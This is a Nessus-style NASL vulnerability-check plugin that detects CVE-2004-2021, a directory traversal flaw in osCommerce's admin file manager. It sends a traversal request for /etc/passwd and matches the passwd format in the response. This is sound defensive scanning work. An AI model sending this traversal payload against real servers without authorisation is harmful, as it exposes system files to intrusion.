#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref:  Rene <l0om@excluded.org> and Megasky <magasky@hotmail.com>
#
# This script is released under the GNU GPL v2
#
if (description)
{
 script_id(17595);
 script_cve_id("CVE-2004-2021");
 script_bugtraq_id(10364);
 script_version ("$Revision: 1.5 $");

 script_name(english:"osCommerce directory traversal");
 desc["english"] = "
The remote host is running osCommerce, a widely installed open source 
shopping e-commerce solution.

The remote version of this software is vulnerable to a directory traversal 
flaw which may be exploited by an attacker to read arbitrary files
on the remote server with the privileges of the web server.

Solution : Upgrade to a newer version of this software
Risk factor : Medium";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if osCommerce is vulnerable to dir traversal");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

dir = make_list(cgi_dirs());

foreach d (dir)
{
 url = string(d, "/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL ) exit(0);

 if (egrep(pattern:"root:0:[01]:.*", string:buf))
 {
   security_warning(port:port);
   exit(0);
 }
}
